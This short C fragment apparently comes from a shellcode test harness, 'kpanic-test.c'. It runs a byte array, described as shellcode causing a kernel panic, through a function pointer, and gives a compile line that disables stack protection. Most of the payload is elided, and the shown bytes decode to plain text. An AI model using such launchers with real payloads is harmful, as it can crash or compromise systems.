...
char shellcode[] = 
	...
	"\x61\x5f\x73\x79\x6d\x62\x6f\x6c\x73\x0a"; /* The actual shellcode for a kernel panic */

    int main () {
        int (*ret) () = (int(*) ())shellcode; /* executing the shellcode */
        ret();
        return 0;
    }

    /* compile with: gcc kpanic-test.c -fno-stack-protector -o kpanic */
